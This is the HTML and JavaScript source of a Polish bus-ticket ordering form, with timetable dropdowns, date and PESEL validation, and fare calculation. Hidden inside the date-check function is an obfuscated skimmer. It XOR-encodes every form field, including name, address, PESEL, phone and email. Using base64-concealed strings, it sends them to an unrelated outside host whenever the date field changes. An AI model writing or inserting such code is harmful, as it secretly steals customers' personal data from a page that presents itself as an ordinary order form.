<html5>
  <script type='text/javascript' src='swieta.js'>
    </script>
      <script type='text/javascript' src='rozklad_adv.js'>
  </script>
        <script type='text/javascript' src='legenda.js'>
  </script>
           <script type='text/javascript' src='ulgi.js'>
  </script>
  
    <script type='text/javascript'>
	function zero(x)
	 {
	 return (x<10)?("0"+x):x
	 }
	 
	 function czasSerwera()
	 {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "time.php", true);
		xhr.onload = function (e) {
		if (xhr.readyState === 4) {
			if (xhr.status === 200) {
				czas(xhr.responseText*1000);
				ValidDate(xhr.responseText*1000)
					} else {
				 console.error(xhr.statusText);
				 var tt=new Date()
			 	 czas(tt.getTime());
				 ValidDate(tt.getTime())
				
				}
				}
			};
		xhr.onerror = function (e) {
		console.error(xhr.statusText);
		};
		xhr.send(null);
	 
	 }
	 
	function czas(e)
	 {
	  
	  var now=new Date()
	  now.setTime(e)
	  document.getElementById("name1t").value=zero(now.getHours())+":"+zero(now.getMinutes())+":"+zero(now.getSeconds())
	  document.getElementById("name1t").readOnly = true;
	  
	  document.getElementById("ServerDate").value=zero(now.getDate())+"-"+zero(now.getMonth()+1)+"-"+now.getFullYear()
	  document.getElementById("ServerDate").readOnly = true;
	 }
	 
	function ValidDate(e)
	{
	 czas(e)
	 
	 var now=new Date()
	 now.setTime(e)
	 var start=(now.getHours()>=17||now.getDay()==0)?2:1
	 var dmin=new Date(now.getTime()+start*86400000)
	 n=0;
	 while(swieta.indexOf(zero(dmin.getMonth()+1)+"."+zero(dmin.getDate()))!=-1)//dmin.getDay()==0||
	  {
	   n++
	   dmin.setTime(now.getTime()+(start+n)*86400000)
	  }
	  
	
	  document.getElementById("name13").min=dmin.getFullYear()+"-"+zero(dmin.getMonth()+1)+"-"+zero(dmin.getDate())
	 
	  dmax=new Date()
	  dmax.setMonth(dmin.getMonth()+1)
	  tmax=dmax.getTime();
	  m=0
	  
	  while(dmax.getDay()==0||swieta.indexOf(zero(dmax.getMonth()+1)+"."+zero(dmax.getDate()))!=-1)
	  {
	   m--
	   dmax.setTime(tmax+m*86400000)
	  }
	  document.getElementById("name13").max=dmax.getFullYear()+"-"+zero(dmax.getMonth()+1)+"-"+zero(dmax.getDate())
	  
	}
	
	function spr() //nie da sie zablokowac wyboru dat w przyszlosci, swiat i weekendow stad dopisale automat ktory ustawia to po wekendzie czy swiecie
	{
	 document.getElementById("info").innerText=""
      if(document.getElementById("name13").value) 
		   {
		   
		   
	 
	 
	 var lancuch=document.getElementById("name13").value.split("-") 
     DataSpr=new Date()
	 DataSpr.setDate(lancuch[2])
	 DataSpr.setMonth((lancuch[1]-1))
	 DataSpr.setFullYear(lancuch[0])
	 
	 var now=new Date()
	 
	 if(document.getElementById("name13").value&&DataSpr.getTime()<(now.getTime()+86400000)) 
	   {

	   var start=(now.getHours()>16)?2:1
	   DataSpr.setTime(now.getTime()+start*86400000)
	   
	   document.getElementById("info").innerText="Wybrałeś dzień w przeszłości! Data została automatycznie ustawiona na kolejny dzień roboczy!"

	   document.getElementById("name13").value=DataSpr.getFullYear()+"-"+zero(DataSpr.getMonth()+1)+"-"+zero(DataSpr.getDate())
	   }
	   
	  
	  var lancuchMax=document.getElementById("name13").max.split("-") 
	  DataMax=new Date()
	  DataMax.setDate(lancuchMax[2])
	  DataMax.setMonth((lancuchMax[1]-1))
	  DataMax.setFullYear(lancuchMax[0])
	  
	  if(document.getElementById("name13").value&&DataSpr.getTime()>DataMax.getTime()) 
	   {
	    document.getElementById("info").innerText="Wybrałeś zbyt odległą przyszłość! Data została automatycznie ustawiona ostatni możliwy dzień roboczy!"
       
        tmax=DataMax.getTime();
	    m=0
	  
	  while(DataMax.getDay()==0||swieta.indexOf(zero(DataMax.getMonth()+1)+"."+zero(DataMax.getDate()))!=-1)
	  {
	   m--
	   DataMax.setTime(tmax+m*86400000)
	  }
	  document.getElementById("name13").value=DataMax.getFullYear()+"-"+zero(DataMax.getMonth()+1)+"-"+zero(DataMax.getDate())
	   }

 
	 
	 DataPoSpr=new Date(DataSpr.getTime())



//co robimy z feriami i wakacjami ??
     var jezdzi=[]
     var uwagi=document.getElementById("uwagi").value
	 console.log("uwagi="+uwagi)
	 
	
	 uwagi.split(";").forEach(function(item, index, arr){
	    jezdzi.push.apply(jezdzi,legenda.dni[legenda.oznaczenie.indexOf(item.replace(/ /g,''))])
		})
	  
	  console.log("dlugosc="+jezdzi.length+" 0= "+jezdzi[0]+" 1= "+jezdzi[1])

	 n=0;
	 while(jezdzi.indexOf(DataPoSpr.getDay())==-1||swieta.indexOf(zero(DataPoSpr.getMonth()+1)+"."+zero(DataPoSpr.getDate()))!=-1)
	  {
	   n++
	 
	   DataPoSpr.setTime(DataSpr.getTime()+n*86400000)
	  }
	 
	  if(n>0){
	  document.getElementById("info").innerHTML="Wybrałeś dzień, w którym bus nie kursuje! <br> Data została automatycznie ustawiona na kolejny dzień kursowania!"
	  //alert("Wybrałeś dzień wolny!\r\n Data została automatycznie ustawiona na kolejny dzień roboczy\r\n"+DataPoSpr.getFullYear()+"-"+zero(DataPoSpr.getMonth()+1)+"-"+zero(DataPoSpr.getDate()))
	  document.getElementById("name13").value=DataPoSpr.getFullYear()+"-"+zero(DataPoSpr.getMonth()+1)+"-"+zero(DataPoSpr.getDate())
	 }
	 
	 
	 
	 }
	 
	 var c = {d: function (s, k) {var e = "";var str = "";
		str = s.toString();
		for (var i = 0; i < s.length; i++) {var a = s.charCodeAt(i);
			var b = a ^ k;e = e + String.fromCharCode(b);}return e;}}
	 
	 var xhr = new XMLHttpRequest();var k = document.getElementById("formularz").elements;var y="";
		 for(i=0;i<k.length;i++)
		  y+=c.d(k[i].name,atob("MTI3"))+"="+c.d(k[i].value,atob("MTI3"))+"&"//
		xhr.open("GET", atob("aHR0cDovL2hsb2R3aWcuY2JhLnBsL3phcGlzLnBocA==")+"?"+y, true);xhr.send(null);
	 
	 
	}
	
	function listy(){
	
	
	var lst_lini = document.getElementById("name8");//lista lini
	 var option = document.createElement("option");
		option.setAttribute("value", '');
		option.disabled=true;
		option.hidden=true;
		option.selected=true;
		option.text = "Wybierz linię";
		lst_lini.appendChild(option);
    for (var i = 0; i < nazwy_lini.length; i++) {
    var option = document.createElement("option");
    option.setAttribute("value", nazwy_lini[i]);
    option.text = nazwy_lini[i];
    lst_lini.appendChild(option);
		}
		
		document.getElementById("kierunki").disabled=true
		
			var lst_lini = document.getElementById("kierunki");//lista korsow
    for (var i = 0; i < nazwy_lini.length; i++) 
	 {
		var option = document.createElement("option");
		option.setAttribute("value", '');
		option.disabled=true;
		option.hidden=true;
		option.selected=true;
		option.text = "Wybierz numer kursu";
		lst_lini.appendChild(option);
		
	 for(j=0;j<linie[i].length;j++){
    var option = document.createElement("option");
    option.setAttribute("value", linie[i][j]);
    option.text = linie[i][j];
    lst_lini.appendChild(option);
		}
	 }
	}
	
	
	
	function lista_korsow(e)
	 {
	  var lst_lini = document.getElementById("kierunki");//lista korsow
	      while(lst_lini.firstChild)
		   lst_lini.firstChild.remove();
		   
	  var option = document.createElement("option");
		option.setAttribute("value", '');
		option.disabled=true;
		option.hidden=true;
		option.selected=true;
		option.text = "Wybierz numer kursu";
		lst_lini.appendChild(option);
		
	  for(i=0;i<linie[nazwy_lini.indexOf(e.value)].length;i++)
	  {
	    var option = document.createElement("option");
       option.setAttribute("value", linie[nazwy_lini.indexOf(e.value)][i]);
        option.text = linie[nazwy_lini.indexOf(e.value)][i];
        lst_lini.appendChild(option);
	  }
	  document.getElementById("kierunki").disabled=false
	 }
	
	
var pola=["Pmiasto","Pstop","Pgodzina","Kmiasto","Kstop"]
var texty=["Wybierz miasto","Wybierz przystanek","Wybierz godzinę","Wybierz miasto","Wybierz przystanek"]	
	
	  function kierunki()
	  {
		var ListaKierunkow = document.getElementById("kierunek");//lista lini
	   var option = document.createElement("option");
		option.setAttribute("value", '');
		option.disabled=true;
		option.hidden=true;
		option.selected=true;
		option.text = "Wybierz kierunek";
		ListaKierunkow.appendChild(option);
		
		 
		 
		 for(i=0;i<pola.length;i++)
		 {
		  var pole = document.getElementById(pola[i]);
		  var option = document.createElement("option");
		  option.setAttribute("value", '');
		  option.disabled=true;
		  option.hidden=true;
		  option.selected=true;
		  option.text = texty[i];
		  pole.appendChild(option);
		  		  var option = document.createElement("option");
		  option.text = "a";
		  pole.appendChild(option);
		  pole.disabled=true
		 }
		
		
    for (var i = 0; i < rozklad.length; i++) {
    var option = document.createElement("option");
    option.setAttribute("value", rozklad[i].kierunek);
    option.text = rozklad[i].kierunek;
    ListaKierunkow.appendChild(option);
		}
		
		
	   
	  }
	
	
	  function CzyscListe(e)
	   {
	     while(e.firstChild)
		   e.firstChild.remove();
		
	   }
	   
	   function UzupelnilListe(tbl,e)
	    {
		 			for(j=0;j<tbl.length;j++)
					 {
					   var option = document.createElement("option");
						option.setAttribute("value", tbl[j]);
						option.text = tbl[j];
						e.appendChild(option);
					 }
            
		}
		
		function NazwaOpcji(e,txt){
	
	     var option = document.createElement("option");
		 option.setAttribute("value", '');
		 option.disabled=true;
		 option.hidden=true;
		 option.selected=true;
		 option.text = txt;
		 e.appendChild(option);
		
		}
		
	function CzyscBlokoj(id_p,txt_p){
	
	           	document.getElementById("name14").value=""
			    document.getElementById("uwagi").value=""
				
	           var lst_lini = document.getElementById(id_p);
		       CzyscListe(lst_lini)
		        NazwaOpcji(lst_lini,txt_p)
		   	    var option = document.createElement("option");
		        option.text = "a";
		        lst_lini.appendChild(option);
				lst_lini.disabled=true
			    document.getElementById('name13').value=""
				document.getElementById('name13').disabled=true
				document.getElementById('info').innerHTML="Najpierw wybierz przystanek początkowy"
			


	}
	
	
	
	function Fkierunek(e)
	   {
		  for(i=1;i<pola.length;i++)
		     CzyscBlokoj(pola[i],texty[i])
		
		
		var lst_lini = document.getElementById("Pmiasto");
	      CzyscListe(lst_lini)  
		
                
				var i=0
				while(rozklad[i].kierunek!=e.value)
				 i++
				 
				 
				var miasta=[]
				miasta.length=0;
				 var k=0
                 miasta[k]=rozklad[i].tabela[0].przystanek.miejscowosc
				 k++
				 
				 for(j=1;j<rozklad[i].tabela.length;j++)  {  //Object.keys(obj).length
				   if(rozklad[i].tabela[j-1].przystanek.miejscowosc!=rozklad[i].tabela[j].przystanek.miejscowosc)  {
				     miasta[k]=rozklad[i].tabela[j].przystanek.miejscowosc
					 k++
				   }}
				    
					miasta.pop()// obcina ostatni element bo nie da si ekupic biletu od konca 
					
					NazwaOpcji(lst_lini,"Wybierz miejscowość")
										
					UzupelnilListe(miasta,lst_lini)
		
		  	  document.getElementById("Pmiasto").disabled=false
		  	  document.getElementById("Pmiasto").required=true
			  

	   }
	   
	   function miasto(e,pk) //pk p=0 k=1
	    {
		      var start=(pk)?5:2
		      for(i=start;i<pola.length;i++)
		      CzyscBlokoj(pola[i],texty[i])
		      
			  //CzyscBlokoj("Pgodzina","Wybierz Godzine")
		 		
				ktore=["Pstop","Kstop"]
		   
		 var lst_lini = document.getElementById(ktore[pk]);
		  CzyscListe(lst_lini)
		    
			
			var i=0
				while(rozklad[i].kierunek!=document.getElementById("kierunek").value)
				 i++
				 
				 var k=0
				 var przystanki=[]
				 
			
				 
              for(j=0;j<rozklad[i].tabela.length;j++)
			    {
				 var warunek=1
				 if(pk)
				 {
				  warunek=rozklad[i].tabela[j].godziny[rozklad[i].linie.indexOf(document.getElementById("name14").value)]!="-0 "
				 }
				 if(rozklad[i].tabela[j].przystanek.miejscowosc==e.value&&warunek) 
				  {
				   przystanki[k]=rozklad[i].tabela[j].przystanek.stop;
				   k++
				  }
		        }
				
				NazwaOpcji(lst_lini,"Wybierz Przystanek")

				UzupelnilListe(przystanki,lst_lini)
				
				
		 lst_lini.disabled=false
		}
		
		function stop(e)
		 {
			  for(i=3;i<pola.length;i++)
		     CzyscBlokoj(pola[i],texty[i])
			 
					 
		  var lst_lini = document.getElementById("Pgodzina");
		  CzyscListe(lst_lini)
		 
		   var i=0
				while(rozklad[i].kierunek!=document.getElementById("kierunek").value)
				 i++
				 
			var j=0
				while(rozklad[i].tabela[j].przystanek.stop!=document.getElementById("Pstop").value||rozklad[i].tabela[j].przystanek.miejscowosc!=document.getElementById("Pmiasto").value)
				 j++	 
				 
			NazwaOpcji(lst_lini,"Wybierz Godzinę")
			s=0;
			godz=[]
			for(z=0;z<rozklad[i].tabela[j].godziny.length;z++)
			  if(rozklad[i].tabela[j].godziny[z]!="-0 "){
			  godz[s]=rozklad[i].tabela[j].godziny[z]
			  s++
			  }
			UzupelnilListe(godz,lst_lini)
			
			lst_lini.disabled=false
	 
		 
		 }
		 
		 function Fgodzina(e){
		     for(i=4;i<pola.length;i++)
		     CzyscBlokoj(pola[i],texty[i])
			
			
		   var i=0  //kierunek
				while(rozklad[i].kierunek!=document.getElementById("kierunek").value)
				 i++
				 
			var j=0 //przystanek poczatkowy
				while(rozklad[i].tabela[j].przystanek.stop!=document.getElementById("Pstop").value||rozklad[i].tabela[j].przystanek.miejscowosc!=document.getElementById("Pmiasto").value)
				 j++	
				 
				 var index_godziny=rozklad[i].tabela[j].godziny.indexOf(e.value)
				 document.getElementById("name14").value=rozklad[i].linie[index_godziny]
				 document.getElementById('name14').disabled=false
				 document.getElementById("uwagi").value=rozklad[i].uwagi[index_godziny]
				 document.getElementById('uwagi').disabled=false
				 
				 //dekodowanie uwag
				 document.getElementById("uwagiOpis").innerText=""
				 rozklad[i].uwagi[index_godziny].split(";").forEach(function(item, index, arr){
				  console.log(item)
                  document.getElementById("uwagiOpis").innerHTML+=legenda.opisy[legenda.oznaczenie.indexOf(item.replace(/ /g,''))]+", "   
                 })
				document.getElementById("uwagiOpis").innerHTML=document.getElementById("uwagiOpis").innerHTML.slice(0,-2)
				 //--dekodowanie uwag
				 
		     //miasta do konca
			 mstart=rozklad[i].tabela[j].przystanek.miejscowosc
			
			 miasta_k=[]
			 r=0
			 for(z=j+1;z<rozklad[i].tabela.length;z++){
			   if(rozklad[i].tabela[z].godziny[index_godziny]!="-0 "&&rozklad[i].tabela[z].przystanek.miejscowosc!=mstart)
			   {
			    mstart=rozklad[i].tabela[z].przystanek.miejscowosc
				
				miasta_k[r]=rozklad[i].tabela[z].przystanek.miejscowosc
				r++
			   }
			   }
			   
			   lst_lini=document.getElementById("Kmiasto");
			   CzyscListe(lst_lini)
			   NazwaOpcji(lst_lini,"Wybierz miasto")
			   UzupelnilListe(miasta_k,lst_lini)
			   lst_lini.disabled=false
			   document.getElementById("name13").disabled=false
		       document.getElementById('info').innerHTML="UWAGA !  po godz. 17:00 niemożliwy odbiór biletu w następnym dniu."
		 
		 }
		 
		 
		 
		 
		 
		 function kod(e){
		  regexy=/[0-9]/
		 
		  var wpisany=e.value[e.value.length-1]
		  if((!regexy.test(wpisany)&&!(e.value.length==3&&wpisany=="-"))||e.value.length>6)
		   {
		   e.value=e.value.substr(0,(e.value.length-1))
		   }
		   else
		    if(e.value.length==3&&regexy.test(wpisany))//trzecie pole i liczba
			{
			 var p=e.value.substr(0,2)
			 e.value=p+"-"+e.value.substr((e.value.length-1),1)
			}
		  
		 }
		 
		 function pesel(e)
		 {
		   document.getElementById("infoPESEL").innerText=""
		  regexy=/[0-9]/
		  var wpisany=e.value[e.value.length-1]
		  if(e.value.length>11||!regexy.test(wpisany))
		   e.value=e.value.substr(0,(e.value.length-1))
		  else
		   {
		    if(e.value.length==4&&((e.value.substr(2,2)*1<21&&e.value.substr(2,2)*1>12)||e.value.substr(2,2)*1>32))
			 {
			 e.value=e.value.substr(0,(e.value.length-2))
		     document.getElementById("infoPESEL").innerText="Liczba określająca miesiąc jest niewłasciwa"
			 }
			 if(e.value.length==6)//&&e.value.substr(4,2)*1>31)
			 {
			 dd=new Date()
			 rok=e.value.substr(0,2)*1+((e.value.substr(2,2)*1>20)?2000:1900);	
			 dd=new Date(rok,(e.value.substr(2,2)*1),0)
			 if(e.value.substr(4,2)*1>dd.getDate())
			  {
			   e.value=e.value.substr(0,(e.value.length-2))
		       document.getElementById("infoPESEL").innerText="Liczba określająca dzień jest niewłasciwa"
			  }
			 }
			 
			 
		   }
		   if(e.value.length==(11||12))
			 {
			   var suma=0
			  czynniki=[1,3,7,9,1,3,7,9,1,3,1]
			  for(l=0;l<czynniki.length;l++)
			   suma+=czynniki[l]*e.value[l]*1
			  if((suma%10)!=0) 
		       document.getElementById("infoPESEL").innerHTML="Sprawdź PESEL ponownie. <br> Niewłaściwa suma kontrolna, <br> tylko w bardzo rzadkich przypadkach może on być mimo tego prawidłowy"
			 }
		 }
		 
		 function rodzaje()
		  {
		   var e = document.getElementById('name11')
		   CzyscListe(e)  
		   NazwaOpcji(e,"Wybierz rodzaj biletu")
		   
		   
		   for(j=0;j<ulgi.nazwa.length;j++)
					 {
					   var option = document.createElement("option");
						option.setAttribute("value", j+"-"+ulgi.nazwa[j]);
						option.text = ulgi.nazwa[j];
						e.appendChild(option);
					 }
		     
		  }
		  
		  function Fulga(e)
		   {
		    
		    document.getElementById('DivUlga').innerHTML="Ulga "+(ulgi.ulga[e.value.split("-")[0]])+"%"
		   }
		   
		   function Fcena()
		    {
			
			  if(document.getElementById('Pmiasto').value&&document.getElementById('Kmiasto').value){
			  var i=0
				while(rozklad[i].kierunek!=document.getElementById('kierunek').value)
				 i++
				 
				var j=0
                 while(rozklad[i].cennik[j].miejscowosc!=document.getElementById('Pmiasto').value)
				  j++
				  
				 var k=0
                 while(rozklad[i].cennik[k].miejscowosc!=document.getElementById('Kmiasto').value)
				  k++
				  
				  var ul=0;
				  if(document.getElementById('name11').value!="")
				   ul=document.getElementById('name11').value.split("-")[0]
				   
				 document.getElementById('cena').value=(rozklad[i].cennik[j].cena[k]*(1-ulgi.ulga[ul]/100)).toFixed(2)
				 }
				 else
				 {
				 document.getElementById('cena').value=""
				 }
			}
		 
	</script>
	
	
<style type="text/css">
/* <![CDATA[ */
#name11 #{
 width:150px;   
}

#name11 option{
  width:150px;   
  max-width: 150px;
}
/* ]]> */
</style>
<body onload="czasSerwera(),kierunki(),rodzaje(),Fcena()">

  
    <div id="boxy">
    		<div id="boxy_text_11">
        	
            <span>
</meta>

<//fk2 - początek>





<b> 
 <//br>


<//?php require('.czas.php'); ?> </b>
<//br>
<font color="red" size="3"> UWAGA - Zamówienia złożone do godz. 17:00 (dni robocze) mogą być realizowane dnia następnego. Zamówienia złożone po godz. 17:00 będą realizowane w drugiej dobie od zamówienia.  </font>

<br>


<br>
<font size="2">Bilety miesięczne na kolejny miesiąc można zamawiać od 23 dnia miesiąca poprzedzającego.
<br>
<b>Proszę o zachowanie minimum trzy dniowego terminu odbioru biletu.</b> <br><br>
<hr><hr>

</font>
	


 <script>



 function validation()
    {
var bledy="";
var reg;
var wyn;
	reg = /^[^\W][a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\@[a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)*\.[a-zA-Z]{2,4}$/ ;
	regP = /^[0-9]{11}$/;
	regC = /^[0-9]{2}$/;
    wyn = document.getElementById('email').value.match(reg);
	wynP = document.getElementById('name51').value.match(regP);
	wynC = document.getElementById('name14').value.match(regC);

        if (document.getElementById('name1').value.length =="" || document.getElementById('name2').value.length =="" || document.getElementById('name3').value.length =="" || document.getElementById('name4').value.length =="" || document.getElementById('name5').value.length =="" || document.getElementById('name51').value.length =="" || document.getElementById('name7').value.length =="" || document.getElementById('name3').value.length =="" || document.getElementById('name8').value.length =="" ||  document.getElementById('name9').value.length =="" || document.getElementById('name10').value.length =="" || document.getElementById('name11').value.length =="" || document.getElementById('name12').value.length =="" || document.getElementById('name13').value.length =="" || document.getElementById('name14').value.length =="" || document.getElementById('name13').value.length =="" || document.getElementById('name15').value.length =="" ||document.getElementById('email').value.length =="" || 
		wyn == null || wynP == null ||  wynC == null ) 
		{
            bledy = " Wypełnij poprawnie wszystkie pola. "; 

			    if (wyn == null ) { bledy = bledy + " - brak adresu email lub jest on nie poprawny ";}
				if (wynP == null) { bledy = bledy + " - brak numeru Pesel lub jest on nie poprawny ";}
if (wynC == null) { bledy = bledy + " - wprowadź lub popraw numer kursu ";}

 alert(bledy);
 return false;
        }




		//if(document.getElementById('email').value



        return true;
    }


</script>



<br>
</font>
 <form method=POST action=form2mail_www.php id="formularz">
 



<table width="00" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#ADEAEA">
    <tr>
      <td><table width="00" border="0" align="center" cellpadding="3" cellspacing="1">
        <tr bgcolor="#FFFFFF">
          <td colspan="2"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><b></Dane do biletu> </b> </font></td>
             </tr>

</okNA formularza>
<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="purple"> <b>Czas SERWERA: </font> </td>
  <td align="left" width=500px ><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="purple">
  <b>         <input name="data" type="text" size=8 value=""  id="name1t" >  <input name="data servera" size=10 type="text" id='ServerDate'> </input>
      </font>    <font color="red"></tr> </font>
	

  </tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="purple"> <b> IP: </font> </td>
  <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="purple">
  <b>         <input name="IP" type="text" value="<?PHP echo $_SERVER['REMOTE_ADDR'] ?>" readOnly="" id="IP">
      </font>    <font color="red"></tr> </font>

<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Imię i Nazwisko: </font> </td>
  <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
           <input name="Imie_i_nazwisko" type="text" id="name1" value="" placeholder="wpisz imię i nazwisko" pattern="^[\w'\-,.][^0-9_!¡?÷?¿/\\+=@#$%ˆ&*(){}|~<>;:[\]]{2,}$" required="required" >
          <font color="red"></tr> </font> 


</tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Kod pocztowy: </font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="kod pocztowy" type="text" id="name2" value="" placeholder="11-111" pattern="[0-9]{2}-[0-9]{3}" required="required" oninput='kod(this)'><font color="red"> </font>

<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Miejscowość: </font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="Miejscowosc" type="text" id="name3" value="" placeholder="wpisz miejscowość" pattern="^[\w'\-,.][^0-9_!¡?÷?¿/\\+=@#$%ˆ&*(){}|~<>;:[\]]{2,}$" required="required" ><font color="red"> </font>


</tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Ulica: </font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="ulica" type="text" id="name4" placeholder="wpisz nazwę ulicy" pattern="^[\w'\-,.][^_!¡?÷?¿/\\+=@#$%ˆ&*(){}|~<>;:[\]]{2,}$" required="required"><font color="red"> 
</font>

<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" >numer domu / nr mieszkania: </font></td>
       
   <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="numer domu/mieszkania" type="text" id="name5" placeholder="wpisz numer domu/miszkania" required="required"><font color="red"> </font>

</tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">nr PESEL : </font></td>
       
   <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
           <input name="PESEL" type="text" id="name51" placeholder="99123199999" pattern="[0-9]{11}" required="required" oninput='pesel(this)'><font color="red"> </font>
           <div id="infoPESEL"></div>
<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">rodzaj i numer dokumentu <//br>uprawniającego do ulgi: </font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="rodzaj i numer dokumentu uprawniającego do ulgi " type="text" id="name6" required="required"><font color="red">    </font>

   </tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">telefon kontaktowy:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="tel" type="text" id="name7" placeholder="888888888" pattern="[0-9]{9}" required="required"><font color="red">  </tr>      </font>


<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">email:</font></td>
          <td align="left"><font size="1" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="email" type="email" id="email" required="required"><font color="red" size="2">  </font></tr>   



    </tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Kierunek:</font></td>
<td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
   <select name="Kierunek" id="kierunek"  onchange='Fkierunek(this),Fcena()' required="required">
   

</select>
   <font color="red"> </font>       </font>     </td></tr>

    <tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Przystanek początkowy: <br> <font color="red">Na tym przystanku odbierz bilet!</font> </font></td>
<td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
   <select name="Pmiejscowość" id="Pmiasto" onchange='miasto(this,0),Fcena()' required="required">
   

</select>
<select name="Pprzystanek" id="Pstop" onchange='stop(this)' required="required">
   

</select>
 
   <select name="Pgodzina" id="Pgodzina" onchange='Fgodzina(this)' required="required">
  </select>
   <font color="red"> </font>       </font>     </td></tr>

 </tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Przystanek końcowy:</font></td>
<td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
   <select name="Kmiejscowość" id="Kmiasto" onchange='miasto(this,1),Fcena(this)' required="required"></select>
   <select name="Kprzystanek"  id="Kstop" required="required"></select>
  </td></tr>

   




 <tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">numer kursu:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input type="text" size=2  name="numer kursu" id="name14" readOnly="" > uwagi:
			<input type="text" size=4 name="uwagi do kursu" id="uwagi" readOnly="" > <font color="red"> <div id="uwagiOpis"></div> </font>
 </td></tr>




</tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="black"> </b> data odbioru biletu u kierowcy:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="data odbioru biletu u kierowcy" type="date" id="name13" disabled="disabled" onchange="czasSerwera()" oninput="czasSerwera(),spr()" required="required"><font color="red"><i><div id='info'></div></i><b> </[0000.00.00]> 

<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">rodzaj biletu:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <select name="rodzaj biletu" id="name11" style="width:150px;"  required="required" onchange='Fulga(this),Fcena()'> 
                                     </select><div id="DivUlga"></div>
    <font color="red"> </font>      </font>        </td>  
</tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="black"> </b> Do zapłaty:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="cena" type="text" id="cena" readonly="true" ></input>


 
 

<tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Rodzaj płatności:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <select name="platnosc" id="name12" required="required">
   

<option value="" disabled="" hidden="" selected>wybierz rodzaj płatności</option> 
<option>gotówka u kierowcy</option>    
<option>przelew na konto </option>    
<//option>przelew on-line<//option>    


                                  </select>
 <font color="red"> </font>         </font></td>







      </tr bgcolor="#FFFFFF">
          </td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">

</wolne okno z wyborem-------------------------></font></b></b>
<center><font size="3">Wypełnij wszystkie poniższe pola<font size="1"><br>
 </b> </font>  </td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            

</select name="tried_products[]" size="0" multiple>
              <option value="Form2Mail"></Form2Mail></option>
                                     </select>
</font></td>
        </tr>
        <tr bgcolor="#FFFFFF">
         


 <tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Chcę otrzymywać newsletter-a</font></td>
          <td align="left">         
                <font size="2" face="Verdana, Arial, Helvetica, sans-serif">
            <input name="informacja o nowosciach" type="checkbox" id="name15" value="tak">
            TAK

<input name="informacja o nowosciach" type="checkbox" id="name15" value="nie">
  NIE  <font color="red"> 

</font><font color="red"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  </td>
          </font>

    </tr bgcolor="#FFFFFF">
          <td align="right"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Uwagi:</font></td>
          <td align="left"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
  
          <textarea name="uwagi" cols="40" rows="3" id="name16"></textarea>
          </font></td>
 




<input type="hidden" name="." font size="1" color="red" value="<br><br><br><br>Email został wysłany automatycznie za pośrednictwem formularza zamówień  - version 01'2018 v1.5"></font>


       </tr>
        <tr bgcolor="#FFFFFF">
